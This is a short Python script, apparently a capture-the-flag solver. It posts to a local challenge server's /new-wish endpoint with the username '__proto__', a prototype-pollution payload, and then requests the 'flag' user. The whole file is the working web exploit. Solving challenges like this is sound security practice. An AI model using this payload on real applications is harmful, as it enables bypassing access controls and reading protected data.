import requests

URL = "http://127.0.0.1:1337"
BIRDNAME = "vie"

r = requests.post(
    URL + "/new-wish", json={"wish": {"GET": True}, "username": "__proto__"}
)
print(r.text)

r = requests.post(URL + "/new-wish", json={"wish": {"hi": True}, "username": "flag"})
print(r.text)
